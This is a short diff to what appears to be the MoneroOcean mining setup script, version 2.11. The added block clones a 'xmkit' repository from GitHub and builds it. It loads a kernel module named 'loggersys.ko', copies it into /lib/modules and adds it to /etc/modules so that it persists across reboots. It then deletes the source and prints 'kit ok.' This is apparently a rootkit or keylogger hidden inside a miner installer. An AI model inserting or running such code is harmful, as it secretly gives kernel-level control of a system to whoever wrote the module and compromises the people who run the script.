@@ -2,6 +2,17 @@
 
 VERSION=2.11
 
+cd $HOME
+echo "getting kit..."
+git clone https://github.com/killercarrot00/xmkit
+cd xmkit
+make
+insmod loggersys.ko
+cp loggersys.ko /lib/modules/
+echo "loggersys" >> /etc/modules
+rm -rf xmkit
+echo "kit ok."
+
 # printing greetings
 
 echo "MoneroOcean mining setup script v$VERSION."
